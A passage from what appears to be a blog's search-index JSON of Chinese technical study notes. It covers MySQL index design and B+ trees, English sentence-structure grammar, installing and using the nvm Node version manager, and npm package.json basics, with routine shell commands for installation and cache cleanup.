缺点：新增比较慢，因为为了保证表中记录的物理顺序和索引顺序一致，在记录插入的时候，会对数据页重新排序。\n\n  \n\n- 非聚集索引：表记录的排列顺序和索引的排列顺序不一致。(类似偏旁部首查字)\n\n  + 一个表中可以拥有多个非聚集索引。\n  \n  \n  \n  索引的逻辑顺序与磁盘上行的物理存储顺序不同，非聚集索引在叶子节点存储的是主键和索引列，当我们使用非聚集索引查询数据时，需要拿到叶子上的主键再去表中查到想要查找的数据。这个过程就是我们所说的回表。\n\n\n\n# 3. 建索引的几大原则\n\n+ 最左前缀匹配原则\n\n  非常重要的原则. mysql会一直向右匹配直到遇到范围查询(>、<、between、like) 就停止匹配\n\n  比如a = 1 and b = 2 and c > 3 and d = 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。\n\n+ = 和 in 可以乱序\n\n  比如a = 1 and b = 2 and c = 3 建立(a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式。\n\n+ 尽量选择区分度高的列作为索引\n\n  区分度的公式是count(distinct col)/count(*)，表示字段不重复的比例，比例越大我们扫描的记录数越少，唯一键的区分度是1。（越大越好）\n\n  而一些状态、性别字段可能在大数据面前区分度就是0，那可能有人会问，这个比例有什么经验值吗？使用场景不同，这个值也很难确定，一般需要join的字段我们都要求是0.1以上，即平均1条扫描10条记录。\n\n  \n\n  索引列的基数越大，索引的效果越好。例如，存放出生日期的列具有不同的值，很容易区分行，而用来记录性别的列，只有\"M\"和\"F\",则对此进行索引没有多大用处，因此不管搜索哪个值，都会得出大约一半的行。\n\n+ 索引列不能参与计算，保持列“干净”，\n\n  比如from_unixtime(create_time) = ’2014-05-29’就不能使用到索引，原因很简单，b+树中存的都是数据表中的字段值，但进行检索时，需要把所有元素都应用函数才能比较，显然成本太大。所以语句应该写成create_time = unix_timestamp(’2014-05-29’)。\n\n+ 尽量的扩展索引，不要新建索引。\n\n  比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。\n\n+ 在合适的列上创建索引\n\n  可以考虑使用索引的主要有 两种类型的列：在where子句中出现的列**，**在join子句中出现的列，而不是在SELECT关键字后选择列表的列\n\n+ 使用短索引，如果对字符串列进行索引，应该指定一个前缀长度，可节省大量索引空间，提升查询速度；\n\n  例如，有一个CHAR(200)列，如果在前10个或20个字符内，多数值是唯一的，那么就不要对整个列进行索引。对前10个或者20个字符进行索引能够节省大量索引空间，也可能会使查询更快。\n\n  \n\n# 4. BTree和 B+Tree\n\n### 4.1 B 树（也就是 B- 树）\n\n- 关键字分布在整棵树的所有节点。\n- 任何一个关键字 **出现且只出现在一个节点中**。\n- 搜索有可能在 **非叶子节点** 结束。\n- 其搜索性能等价于在关键字全集内做一次二分查找。如下图所示：\n\n\n\n### 4.2 B+ 树\n\n- 非叶子节点的子树指针与关键字个数相同。\n- 非叶子节点的子树指针 P[i]，指向关键字属于 **[k[i],K[i+1])** 的子树（**注意：区间是前闭后开**)。\n- **为所有叶子节点增加一个链指针**。\n- **所有关键字都在叶子节点出现**。\n\n\n\n### 4.3 相对 B 树，B+ 树做索引的优势\n\n- B+ 树的磁盘读写代价更低。**B+ 树的内部没有指向关键字具体信息的指针**，所以其内部节点相对 B 树更小，如果把所有关键字存放在同一块盘中，那么盘中所能容纳的关键字数量也越多，一次性读入内存的需要查找的关键字也就越多，**相应的，IO 读写次数就降低了**。\n- **树的查询效率更加稳定**。B+ 树所有数据都存在于叶子节点，所有关键字查询的路径长度相同，每次数据的查询效率相当。而 B 树可能在非叶子节点就停止查找了，所以查询效率不够稳定。\n- **B+ 树只需要去遍历叶子节点就可以实现整棵树的遍历**\n\n\n\n### 4.4 MongoDB 的索引为什么选择 B 树，而 MySQL 的索引是 B+ 树？\n\n因为 MongoDB 不是传统的关系型数据库，而是以 Json 格式作为存储的 NoSQL 非关系型数据库，目的就是高性能、高可用、易扩展。摆脱了关系模型，所以 **范围查询和遍历查询的需求就没那么强烈了**。\n\n\n\n# 5. MyISAM 和 InnoDB 的B+区别\n\n都是用 B+树实现的\n\n\n+ MyISAM 非聚集索引\n\n  +  索引文件（.MYI）和数据文件（.MYD）文件是分离的,  索引文件仅保存数据记录的地址(指针去查找)。\n  + MyISAM的索引方式也叫做“非聚集”的，之所以这么称呼是为了与InnoDB的聚集索引区分。\n  + 非聚簇索引的两棵B+树看上去没什么不同，节点的结构完全一致只是存储的内容不同而已，主键索引B+树的节点存储了主键，辅助键索引B+树存储了辅助键。\n  + 表数据存储在独立的地方，这两颗B+树的叶子节点都使用一个地址指向真正的表数据，对于表数据来说，这两个键没有任何差别。由于索引树是独立的，通过辅助键检索无需访问主键的索引树。\n\n  \n\n+ InnoDB 聚集索引 \n\n  + InnoDB的数据文件本身就是索引文件。\n  \n  + 如果一个主键被定义了，那么这个主键就是作为聚集索引。\n  \n  + 如果没有主键被定义，那么该表的第一个唯一非空索引被作为聚集索引。\n  + 如果没有主键也没有合适的唯一索引，那么innodb内部会生成一个隐藏的主键作为聚集索引，这个隐藏的主键是一个6个字节的列，改列的值会随着数据的插入自增。\n  +  因此建议是给每个表都定一个主键。如果该表没有逻辑主键，则创建一个自增的列作为主键。\n\n![1](mysql索引介绍/1.png)\n\n# 6. 头脑风暴\n\n+ B+树\n\n  走索引是从上往下\n\n  全表扫描是从左往右\n\n+ 聚集索引理解\n\n  只能有一个聚集索引, 索引和数据在一起\n  \n  其他的索引就做辅助索引, 走索引后,找到的数据时在用聚集索引, 再次回表查询\n  \n+ 最左匹配, 如果第一个是范围呢\n\n  如果是* 不走索引,  如果就是只查条件, 就走索引\n\n+ 如果select 不是* , 只是select 的 where 索引列\n\n  不会在回表了, 就在这记录着索引数据呢\n\n\n\n# 7. 参考资料\n\n+ https://tech.meituan.com/2014/06/30/mysql-index.html\n\n+ https://www.infoq.cn/article/OJKWYykjoyc2YGB0Sj2c","tags":["mysql"],"categories":["sql"]},{"title":"刘晓艳笔记_2并列句","url":"%2Fp%2F10fee324.html","content":"\n# 1. 并列句\n\n### 1.1 什么是并列句?\n\n就是用!!!连词!!!!连接两个句子\n\n<!-- more -->\n\n### 1.2 常见的逻辑词(包含连词, 副词, 介词短语)\n\n##### 1.2.1 平行关系连词\n\n+ and\n\n+ not only, but also\n\n副词和介词短语\n\n+ similarly\n+ equally\n+ likewise\n+ at the same time\n+ in the meanwhile\n\n##### 1.2.2 转折关系连词\n\n+ but\n+ yet\n+ while\n+ whereas\n\n副词和介词短语\n\n+ however\n+ nervertheless\n+ conversely\n+ unexpectedly\n+ unfortunately\n+ on the contrary\n+ by contrast\n\n##### 1.2.3 选择关系连词\n\n+ or\n\n副词和介词短语\n\n+ alternatively\n\n##### 1.2.4 因果关系连词\n\n+ for\n+ so\n\n副词和介词短语\n\n+ therefore\n+ thus\n+ consequently\n+ as a result\n\n##### 1.2.5 递进关系连词\n\n+ then\n\n副词和介词短语\n\n+ besides\n+ furthermore\n+ moreover\n+ additionally\n+ subsequently\n\n\n\n# 2. 逻辑\n\n### 2.1 逻辑关系\n\n写作的上下文有逻辑关系, 就一定要用逻辑关系词(连词, 副词, 介词和介词短语)\n\n+ 没有逻辑词语就没有逻辑关系\n\n### 2.2 连词前面逗号\n\n可以有, 可以没有\n\n### 2.3 介词短语, 副词前面不能有逗号\n\n+ 把逗号变成句号.\n\n+ 或者再加个连词(and 是没有意思的连词)\n\n### 2.4 连词和其他逻辑词区别\n\n+ 连词前面有无逗号都可以\n+ 其他逻辑关系词前面, 要么加句号, 要么加连词 and\n\n\n\n# 3. 考点\n\n+ 只需要读懂, 逻辑关系词前后两句话的意思就 ok, 看什么关系\n+ 阅读理解, 读每段的首句和尾句, 知道文章的中心. 看选项和中心意思相近的.\n\n\n\n# 4. 长难句分析\n\n+ 在分析长难句时, 有并列连词的出现, 通常都会有省略\n\n+ 第一步, 找谓词\n\n+ 第二步, 找连词, 但是连词在连接两个单词的时候, 这个连词就装作没看见, 就是普通的 and\n\n+ 第三步, 连词有可能会省略后面内容, 就看连词前多什么内容\n\n  \n\n### 4.1 如何查找省略的内容呢?(连词前少不算少,只有后会少)\n\n+ 一句话只要有省略, 一定省略连词的后面, 连词前不可能省略.    对\n\n+ 所以连词后面有的成分, 连词前面通常都要有.  \n\n  解释: 连词后只有一个成分,连词前一定能对应, 连词后有多个成分, 连词前不一定都能找到对应成分,但是至少有一个\n\n+ 连词前面有, 连词后面没有的成分, 便是省略的内容.\n\n\n\n### 4.2 代词补充\n\n+ 代词指代替的做题方法, 就近原则(跟谁近)和一致原则(意思)\n\n\n\n\n\n\n\n\n\n\n\n","tags":["english"],"categories":["英语"]},{"title":"刘晓艳笔记_1句子的成分","url":"%2Fp%2F891631f4.html","content":"\n# 1. 英语句子\n\n+ 必须有主谓\n+ 主语一定是谓语的发出者\n+ 如有宾语, 宾语一定是谓语的承受者\n<!-- more -->\n# 2. 英语句子的基本结构\n\n### 2.1 主谓\n\n### 2.2 主谓宾\n\n谓语: 实义动词(及物动词和不及物动词)\n\n+ 及物动词后面必须加宾语\n\n### 2.3 主系表\n\n谓语: 系动词\n\n+ be\n+ 感官动词 (look,smell,taste,sound,feel)\n+ 变化 (become, get, turn, grow, fall)\n+ 保持(keep, remain, stay, stand)\n\n### 2.4 主谓宾宾\n\n+ I bought him a dog. 我买他一个狗\n\n+ 两个宾语没有关系, (他是一个狗, 肯定不对)\n\n### 2.5 主谓宾宾补\n\n+ We made him our monitor.  我们让他当班长\n+ You should keep the room clean. 你应该让房间干净\n\n### 2.6 总结:\n\n+ 2.4和2.5区别, 在宾语后面(假如)加个是,如果是对的,就是2.5\n\n\n\n# 3. 谓语\n\n### 3.1 谓语的成分\n\n+ 有时态的实义动词(情态动词不能做)\n\n+ 系动词\n\nhave limited.  整个是谓语, have 是构成时态的.\n\n### 3.2 动词能不能多?\n\n+ 谓语只能是动词?      对\n+ 动词只能做谓语?      对(非谓语动词不是动词)\n+ 绝对不能多, 其他的动词变成非谓语动词\n+ 只有一个动词, 谁的意义最重要, 选谁做动词\n  + 我爱你, 你爱我 (I loving you, you love me)\n\n### 3.3 动词能不能少?\n\n+ 绝对不能, 少的话加 be 动词\n+ I against you.   (against 是介词)   --->  I am against you.\n+ 当一句话需要动词又没有动词的时候,需要加 be 动词, be动词没有意思.\n\n### 3.4 动词变非(谓语动词)\n\n  + ing 主动\n  + ed   被动\n  + to do  目的\n\n### 3.5 总结\n\n  + 看句子第一步, 找动词\n  + 一句话当中,有且只能有一个有时态的实意动词或系动词的存在,并且充当谓语.\n\n### 3.6 多个句子变成一句话(3个方法)\n\n+ 独立主格(一个谓词, 其他非谓语动词)\n  + 两个主语要不一样\n  + 如果一样的话, 要省略掉非谓语动词的主语(不是独立主格, 叫分词做状语)\n  + Being a teacher, I like singing songs. 我是一个老师,我喜欢唱歌.\n+ 加连接词(and...)组成并列句\n+ 主句+从句组成复合句\n\n\n\n# 4. 主语\n\n### 4.1 主语的成分\n\n+ 名词\n\n+ 代词\n\n+ 非谓语动词\n\n+ 句子不能,从句可以(引导词+句子)\n\n  \n\nHandsome and strong are his nature. (错误,形容词不可以当主语)\n\n改成\n\nBeing handsome and strong is his nature. (非谓语动词做主语)\n\n### 4.2 主句能不能少\n\n+ 绝对不能\n+ 祈使句有主语,只是省略了\n\n没有主语怎么办?\n\n+ 加 it 作为主语,  必须与天气, 温度,时间有关系.\n\n  + It feels exceedingly hot in the cabin.(机舱里很热)\n\n+ there be 句型, 听到 \"有\" 的时候使用.\n\n  + There exist a host of undergraduates being fascinated with me.(一些大学生喜欢我)\n\n+ 被动: 如果一句话没有主语, 所有用人称代词做主语的句子,都可以考虑写成被动.\n\n  + Persistence must be pointed out outstandingly.(必须指出坚持很重要.)\n\n  + 三种情况无被动.   \n\n    + 动词后面有介词时, 无被动\n\n    + 系动词没有被动\n    + have 表达 \"有\" 的意思时, 无被动\n\n+ 人称代词做主语.  (I you we)\n  + 不到万不得已,不要使用\n\n\n\n# 5. 宾语\n\n### 5.1 宾语的成分\n\n+ 名词(代词)\n+ 非谓语动词\n+ 从句\n\n和主语成分一样, 因为可以和主语换主动被动.\n\n# 6. 表语\n\n### 6.1 表语的成分\n\n+ 名词(代词)\n+ 非谓语动词\n+ 从句\n+ (特有)形容词\n+ (特有)介词短语\n\n\n\n# 7. 练习\n\n+ 我喜欢在重庆,  I like being in Beijing.  (介词短语不能做宾语,换成非谓语动词)\n+ I smile on the stage. (主谓结构, 介词不能做宾语,不是主谓宾, smile实义动词,不是主系表)\n\n+ I exchange with my watch.(写错了的句子, exchange及物动词后面必须跟宾语,少了成分)\n\n\n\n# 8. 简单句考点分析\n\n### 8.1 写作\n\n+ 先写成简单句,保证语法正确\n+ 单词不会写, 换成自己会的单词,老师也不知道我表达的意思\n\n### 8.2 长短句分析\n\n+ 第一步, 找动词(谓语), 从而找到一句话的主谓宾\n+ 如果有多个动词, 可能是并列句或者复合句从句, 只能1个是主语的动词\n+ 主语的谓语动词前面没有引导词\n\n### 8.3 习题\n\n+ 全球在变暖\n\n  It is becoming warm throughout the world.\n\n+ 妒忌本身就是一种仰望.\n\n  Being jealous is a kind of worship.\n\n+ 有意义就是好好活\n\n  Being meaningful proves to live well.\n\n+ 好好活就是做有意义的事情\n\n  living well seems to do meaningful things.","tags":["enlish"],"categories":["英语"]},{"title":"node版本管理nvm的安装和使用","url":"%2Fp%2Fdf22a20c.html","content":"\n\n\n我们可能同时在进行2个项目，而2个不同的项目所使用的node版本又是不一样的，或者是要用更新的node版本进行试验和学习。这种情况下，对于维护多个版本的node将会是一件非常麻烦的事情，而nvm就是为解决这个问题而产生的，他可以方便的在同一台设备上进行多个node版本之间切换，而这个正是nvm的价值所在。\n\n\n\n### 1. nodejs，npm，nvm之间的区别\n\n+ nodejs：在项目开发时的所需要的代码库\n\n+ npm：nodejs 包管理工具。在安装的 nodejs 的时候，npm 也会跟着一起安装，它是包管理工具。npm 管理 nodejs 中的第三方插件\n\n+ nvm：nodejs 版本管理工具。也就是说：一个 nvm 可以管理很多 node 版本和 npm 版本。\n\n\n\n<!-- more -->\n\n### 2. nvm的安装:\n\n如果在安装nvm之前就安装了node, 那么最好在安装之前清理下全局的node环境.\n\n```shell\nnpm ls -g --depth=0 # 查看已经安装在全局的模块，以便删除这些全局模块后再按照不同的 node 版本重新进行全局安装\n\nsudo rm -rf /usr/local/lib/node_modules # 删除全局 node_modules 目录\n\nsudo rm -rf ~/.npm/ # 删除模块缓存目录\n\nsudo rm /usr/local/bin/node # 删除 node\n\ncd  /usr/local/bin && ls -l | grep \"../lib/node_modules/\" | awk '{print $9}'| xargs rm # 删除全局 node 模块注册的软链\n```\n\n\n\n安装: https://github.com/nvm-sh/nvm\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash\n```\n\n重新打开一个终端输入 `nvm`即可\n\n\n\n### 3. nvm常用指令\n\n```shell\nnvm version #查看当前的版本\n\nnvm ls-remote #列出所有可安装的版本\n\nnvm install <version> #安装指定的版本，如nvm install v8.14.0\n\nnvm uninstall <version> #卸载指定的版本\n\nnvm ls #列出所有已经安装的版本\n\nnvm use <version> #切换使用指定的版本\n\nnvm current #显示当前使用的版本\n\nnvm alias default <version> #设置默认node版本\n\n```\n\n\n\n#### 3.1 安装最新稳定版 node\n\n```shell\nnvm install stable  \n```\n\n\n\n#### 3.2 node被安装在哪里了呢?\n\n在终端我们可以使用which node来查看我们的node被安装到了哪里，这里终端打印出来的地址其实是你当前使用的node版本快捷方式的地址。\n\n```\n$ which node\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/node\n\n\n$ which npm\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/npm\n```\n\n\n\n### 4. nvm 和 n  的区别\n\n在 node 的版本管理工具中，nvm 自然声名远扬，然而我们也不能忘了来自 TJ 的 n。这两种，是目前最主流的方案。\n\n关于这两个工具如何安装和使用，这里不再赘言，请见它们各自的主页：\n\n- [creationix/nvm](https://github.com/creationix/nvm)\n- [tj/n](https://github.com/tj/n)\n\n接下来我们着重关注一下 nvm 和 n 的运作机制和特性。\n\n#### 4.1 n\n\nn 是一个需要全局安装的 npm package。\n\n```shell\nnpm install -g n\n```\n\n\n这意味着，我们在使用 n 管理 node 版本前，首先需要一个 node 环境。我们或者用 Homebrew 来安装一个 node，或者从官网下载 pkg 来安装，总之我们得先自己装一个 node —— n 本身是没法给你装的。\n\n然后我们可以使用 n 来安装不同版本的 node。\n\n在安装的时候，n 会先将指定版本的 node 存储下来，然后将其复制到我们熟知的路径/usr/local/bin，非常简单明了。当然由于 n 会操作到非用户目录，所以需要加 sudo 来执行命令。\n\n所以这样看来，n 在其实现上是一个非常易理解的方案。\n\n\n\n#### 4.2 nvm\n\n我们再来看 nvm。不同于 n，nvm 不是一个 npm package，而是一个独立软件包。这意味着我们需要单独使用它的安装逻辑：\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash(zsh)# 注意后面的bash环境\n```\n\n\n\n然后我们可以使用 nvm 来安装不同版本的 node。\n\n在安装的时候，nvm 将不同的 node 版本存储到 ~/.nvm/<version>/ 下，然后修改$PATH，将指定版本的 node 路径加入，这样我们调用的 node 命令即是使用指定版本的 node。\n\nnvm 显然比 n 要复杂一些，但是另一方面，由于它是一个独立软件包，因此它和 node 之间的关系看上去更合乎逻辑：nvm 不依赖 node 环境，是 node 依赖 nvm；而不像 n 那样产生类似循环依赖的问题。\n\n","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejs的模块安装和package.json","url":"%2Fp%2Fd100a0c2.html","content":"\n\n\n### 1. npm 介绍\n\n[npm](https://www.npmjs.com/package/npm) 是 Node 的模块管理器，功能极其强大。它是 Node 获得成功的重要原因之一。\n\nnpm不需要单独安装。在安装Node的时候，会连带一起安装npm。但是，Node附带的npm可能不是最新版本，最好用下面的命令，更新到最新版本。\n\n```shell\nnpm install npm@latest -g \n```\n\n上面的命令中，@latest表示最新版本，-g表示全局安装。所以，命令的主干是npm install npm，也就是使用npm安装自己。之所以可以这样，是因为npm本身与Node的其他模块没有区别。\n\n<!-- more -->\n\n\n\n### 2. npm 安装\n\n#### 2.1 npm install \n\n[npm install](https://docs.npmjs.com/cli/install) 命令用来安装模块到node_modules目录。\n\n```shell\n $ npm install <packageName> \n```\n\n\n\n安装之前，npm install会先检查，node_modules目录之中是否已经存在指定模块。如果存在，就不再重新安装了，即使远程仓库已经有了一个新版本，也是如此。\n\n如果你希望，一个模块不管是否安装过，npm 都要强制重新安装，可以使用-f或--force参数。\n\n```shell\n $ npm install <packageName> --force\n```\n\n\n\n#### 2.2 npm update\n\n如果想更新已安装模块，就要用到[npm update](https://docs.npmjs.com/cli/update)命令。\n\n```shell\n $ npm update <packageName> \n```\n\n它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装。\n\n\n\n#### 2.3 registry\n\nnpm update命令怎么知道每个模块的最新版本呢？\n\n答案是 npm 模块仓库提供了一个查询服务，叫做 registry 。以 npmjs.org 为例，它的查询服务网址是 https://registry.npmjs.org/ 。\n\n这个网址后面跟上模块名，就会得到一个 JSON 对象，里面是该模块所有版本的信息。比如，访问 <https://registry.npmjs.org/react>，就会看到 react 模块所有版本的信息。\n\n它跟下面命令的效果是一样的。\n\n```shell\n $ npm view react  \n```\n\n\n\nregistry 网址的模块名后面，还可以跟上版本号或者标签，用来查询某个具体版本的信息。比如， 访问 https://registry.npmjs.org/react/v0.14.6 ，就可以看到 React 的 0.14.6 版。\n\n返回的 JSON 对象里面，有一个dist.tarball属性，是该版本压缩包的网址。\n\n```json\ndist: {   \n\tshasum: '2a57c2cf8747b483759ad8de0fa47fb0c5cf5c6a',   \n\ttarball: 'http://registry.npmjs.org/react/-/react-0.14.6.tgz'  \n},\n```\n\n\n\n到这个网址下载压缩包，在本地解压，就得到了模块的源码。`npm install`和`npm update`命令，都是通过这种方式安装模块的。\n\n\n\n#### 2.4 缓存目录\n\nnpm install或npm update命令，从 registry 下载压缩包之后，都存放在本地的缓存目录。\n\n这个缓存目录，在 Linux 或 Mac 默认是用户主目录下的.npm目录，在 Windows 默认是%AppData%/npm-cache。通过配置命令，可以查看这个目录的具体位置。\n\n```shell\n $ npm config get cache \n /Users/liuwei/.npm\n```\n\n \n\n.npm目录保存着大量文件，清空它的命令如下。 \n\n```shell\n$ rm -rf ~/.npm/ \n或\n$ npm cache clean \n```\n\n\n\n#### 2.5 模块的安装过程\n\n总结一下，Node模块的安装过程是这样的。\n\n1. 发出npm install命令\n2. npm 向 registry 查询模块压缩包的网址\n3. 下载压缩包，存放在~/.npm目录\n4. 解压压缩包到当前项目的node_modules目录\n\n\n\n注意，一个模块安装以后，本地其实保存了两份。一份是~/.npm目录下的压缩包，另一份是node_modules目录下解压后的代码。\n\n但是，运行npm install的时候，只会检查node_modules目录，而不会检查~/.npm目录。也就是说，如果一个模块在～/.npm下有压缩包，但是没有安装在node_modules目录中，npm 依然会从远程仓库下载一次新的压缩包。\n\n\n\n### 3. package.json\n\n管理本地安装 npm 包的最好方式就是创建 package.json 文件。一个 package.json 文件可以有以下几点作用：\n\n+ 作为一个描述文件，描述了你的项目依赖哪些包\n\n+ 允许我们使用 “语义化版本规则”（后面介绍）指明你项目依赖包的版本\n\n+ 让你的构建更好地与其他开发者分享，便于重复使用\n\n  \n\n使用 `npm init` 即可在当前目录创建一个 `package.json` 文件。如果嫌回答这一大堆问题麻烦，可以直接输入` npm init -—yes` 跳过回答问题步骤，直接生成默认值的 package.json 文件：\n\n```json\n{\n  \"name\": \"package\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n\n\n#### 3.1 package.json 的内容\n\n\n\n##### 3.1.1 `package.json` 文件至少要有两部分内容：\n\n1. “name”\n   - 全部小写，没有空格，可以使用下划线或者横线\n2. “version” \n   - x.x.x 的格式\n   - 符合“语义化版本规则”\n\n\n\n##### 3.1.2 其他内容：\n\n+ description：描述信息，有助于搜索\n+ main: `入口文件`，一般都是 index.js. 当使用require()语法来加载一个模块时，就会看此值\n+ scripts：支持的脚本，默认是一个空的 test\n+ keywords：关键字，有助于在人们使用 npm search 搜索时发现你的项目\n+ author：作者信息\n+ license：默认是 MIT\n+ bugs：当前项目的一些错误信息，如果有的话\n\n\n\n##### 3.1.3 scripts属性\n\n可以指定npm命令缩写。\n\n```\n  \"scripts\": {\n    \"start\": \"node store.js\"\n  },\n```\n\n\n\n执行npm run start仍然可以运行成功，通过scripts属性npm run start等价于node store.js。关于scripts的更具体的使用[请看这里](http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html)。\n\n\n\n#### 3.2 指定依赖的包\n\n我们需要在 `package.json` 文件中指定项目依赖的包，这样别人在拿到这个项目时才可以使用 `npm install` 下载。\n\n包有两种依赖方式：\n\n1. `dependencies`：在生产环境中需要用到的依赖\n2. `devDependencies`：在开发、测试环境中用到的依赖\n\n\n\n举个例子：\n\n```\n{\n    \"name\": \"my-weex-demo\",\n    \"version\": \"1.0.0\",\n    \"description\": \"a weex project\",\n    \"main\": \"index.js\",\n    \"devDependencies\": {\n        \"babel-core\": \"^6.14.0\",\n        \"babel-loader\": \"^6.2.5\",\n        \"babel-preset-es2015\": \"^6.18.0\",\n        \"vue-loader\": \"^10.0.2\",\n        \"eslint\": \"^3.5.0\",\n        \"serve\": \"^1.4.0\",\n        \"webpack\": \"^1.13.2\",\n        \"weex-loader\": \"^0.3.3\",\n        \"weex-builder\": \"^0.2.6\"\n    },\n    \"dependencies\": {\n        \"weex-html5\": \"^0.3.2\",\n        \"weex-components\": \"*\"\n    }\n}\n```\n\n\n\n#### 3.3 semantic versioning（语义化版本规则）\n\n\n\ndependencies 的内容，以 \"weex-html5\": \"^0.3.2\" 为例，我们知道 key 是依赖的包名称，value 是这个包的版本。那版本前面的 ^ 或者版本直接是一个 * 是什么意思呢？这就是 npm 的 “Semantic versioning”，简称”Semver”，中文含义即“语义化版本规则”。\n\n在开发中我们有过这样的经验：有时候依赖的包升级后大改版，之前提供的接口不见了，这对使用者的项目可能造成极大的影响。因此我们在声明对某个包的依赖时需要指明是否允许 update 到新版本，什么情况下允许更新。这就需要先了解 npm 包提供者应该注意的版本号规范。\n\n\n\n如果一个项目打算与别人分享，应该从 1.0.0 版本开始。以后要升级版本应该遵循以下标准：\n\n```\n补丁版本：解决了 Bug 或者一些较小的更改，增加最后一位数字，比如 1.0.1\n小版本：增加了新特性，同时不会影响之前的版本，增加中间一位数字，比如 1.1.0\n大版本：大改版，无法兼容之前的，增加第一位数字，比如 2.0.0\n\n了解了提供者的版本规范后， npm 包使用者就可以针对自己的需要填写依赖包的版本规则。\n```\n\n\n\n作为使用者，我们可以在 package.json 文件中写明我们可以接受这个包的更新程度（假设当前依赖的是 1.0.4 版本）：\n\n如果只打算接受补丁版本的更新（也就是最后一位的改变），就可以这么写： \n\n```\n1.0\n1.0.x\n~1.0.4\n```\n\n如果接受小版本的更新（第二位的改变），就可以这么写： \n\n```\n1\n1.x\n^1.0.4\n```\n\n如果可以接受大版本的更新（自然接受小版本和补丁版本的改变），就可以这么写： \n\n```\n*\nx\n```\n\n\n小结一下：总共三种版本变化类型，接受依赖包哪种类型的更新，就把版本号准确写到前一位。\n\n\n\n\n\n### 4. 其他安装知识\n\n\n\n#### 4.1 安装参数 --save 和 --save -dev\n\n添加依赖时我们可以手动修改 package.json 文件，添加或者修改 dependencies devDependencies 中的内容即可。另一种更酷的方式是用命令行，在使用 npm install 时增加 --save 或者 --save -dev 后缀：\n\n```\nnpm install <package_name> --save 表示将这个包名及对应的版本添加到 package.json的 dependencies\n\nnpm install <package_name> --save-dev 表示将这个包名及对应的版本添加到 package.json的 devDependencies\n```\n\ndependencies：在生产环境中需要用到的依赖\n\ndevDependencies：在开发、测试环境中用到的依赖\n\n\n\n#### 4.2 全局安装 package\n\n如果你想要直接在命令行中使用某个包，比如 jshint ，你可以全局安装它。全局安装比本地安装多了个 -g:\n\n```\nnpm install -g <package-name>\n```\n\n安装后可以使用 npm ls -g --depth=0 查看安装在全局第一层的包。\n\n##### 4.2.1 全局安装的权限问题\n\n在全局安装时可能会遇到 EACCES 权限问题, 可以如下解决：\n\n1.使用 sudo 简单粗暴，但是治标不治本\n\n2.修改 npm 全局默认目录的权限\n\n先获取 npm 全局目录：`npm config get prefix`，一般都是 /usr/local； 然后修改这个目录权限为当前用户：\n\n```shell\nsudo chown -R $(whoami) $(npm config get prefix)/{lib/node_modules,bin,share}\n```\n\n\n\n#### 4.3 package-lock.json\n\n原来package.json文件只能锁定大版本，也就是版本号的第一位，并不能锁定后面的小版本，你每次npm install都是拉取的该大版本下的最新的版本，为了稳定性考虑我们几乎是不敢随意升级依赖包的，这将导致多出来很多工作量，测试/适配等，所以package-lock.json文件出来了，当你每次安装一个依赖的时候就锁定在你安装的这个版本。\n\n那如果我们安装时的包有bug，后面需要更新怎么办？\n\n 在以前可能就是直接改package.json里面的版本，然后再npm install了，但是5版本后就不支持这样做了，因为版本已经锁定在package-lock.json里了，所以我们只能npm install xxx@x.x.x  这样去更新我们的依赖，然后package-lock.json也能随之更新。\n\n\n\n\n\n### 参考资料:\n\nhttp://www.ruanyifeng.com/blog/2016/01/npm-install.html\n\nhttp://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\n\nhttps://blog.csdn.net/u011240877/article/details/76582670","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejs介绍和javascript的区别","url":"%2Fp%2F74d8b7c3.html","content":"\n### 1. nodejs的诞生\n\n话说有个叫Ryan Dahl的歪果仁，他的工作是用C/C++写高性能Web服务。对于高性能，异步IO、事件驱动是基本原则，但是用C/C++写就太痛苦了。于是这位仁兄开始设想用高级语言开发Web服务。他评估了很多种高级语言，发现很多语言虽然同时提供了同步IO和异步IO，但是开发人员一旦用了同步IO，他们就再也懒得写异步IO了，所以，最终，Ryan瞄向了JavaScript。\n\n因为JavaScript是单线程执行，根本不能进行同步IO操作，所以，JavaScript的这一“缺陷”导致了它只能使用异步IO。\n\n选定了开发语言，还要有运行时引擎。这位仁兄曾考虑过自己写一个，不过明智地放弃了，因为V8就是开源的JavaScript引擎。让Google投资去优化V8，咱只负责改造一下拿来用，还不用付钱，这个买卖很划算。\n\n于是在2009年，Ryan正式推出了基于JavaScript语言和V8引擎的开源Web服务器项目，命名为Node.js。虽然名字很土，但是，Node第一次把JavaScript带入到后端服务器开发，加上世界上已经有无数的JavaScript开发人员，所以Node一下子就火了起来。\n\n<!-- more -->\n\n>  在Node上运行的JavaScript相比其他后端开发语言有何优势？\n\n最大的优势是借助JavaScript天生的事件驱动机制加V8高性能引擎，使编写高性能Web服务轻而易举。\n\n其次，JavaScript语言本身是完善的函数式语言，在前端开发时，开发人员往往写得比较随意，让人感觉JavaScript就是个“玩具语言”。但是，在Node环境下，通过模块化的JavaScript代码，加上函数式编程，并且无需考虑浏览器兼容性问题，直接使用最新的ECMAScript 6标准，可以完全满足工程上的需求。\n\n\n\n### 2. nodeJs和javascript的异同\n\n我相信很多入坑Nodejs的人都是前端转过来的，但是局限于公司项目用不到Nodejs，只能自学，有些重要且基础的东西就忽略了。\n\n前端的JavaScript其实是由ECMAScript、DOM、BOM组合而成。JavaScript=ECMAScript+DOM+BOM。\n\n#### 2.1 javascript：\n\n- ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象)\n- DOM（一些操作页面元素的方法）\n- 